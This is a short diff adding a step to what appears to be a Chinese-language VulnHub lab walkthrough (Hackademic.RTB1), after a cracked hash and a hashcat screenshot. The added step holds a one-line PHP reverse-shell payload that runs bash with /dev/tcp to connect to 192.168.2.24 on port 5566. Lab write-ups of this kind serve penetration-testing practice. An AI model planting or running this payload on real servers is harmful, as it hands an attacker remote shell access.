@@ -278,3 +278,9 @@ MaxBucky:50484c19f1afdaf3841a0d821ed393d2(kernel)
 
 	![hashcat](vulnhubScreenShot/Hackademic.RTB1/kali-linux-2026.1-vmware-amd64-2026-07-25-14-14-04.png)
 
+6. php反弹shell
+
+```php
+<?php exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.2.24/5566 0>&1"');?>
+```
+
